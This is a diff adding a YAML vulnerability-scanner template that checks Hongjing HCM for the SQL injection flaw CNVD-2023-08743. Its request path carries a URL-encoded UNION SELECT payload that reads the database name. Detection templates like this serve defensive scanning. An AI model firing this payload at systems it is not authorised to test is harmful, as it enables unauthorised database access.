@@ -1,0 +1,11 @@
+name: 宏景HCM-CNVD-2023-08743-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=1&categories=~31~27~20union~20all~20select~20~27~31~27~2cdb~5fname~28~29~2d~2d~20
+    expression:
+      status: 200
+      body_all: ["ykchr"]
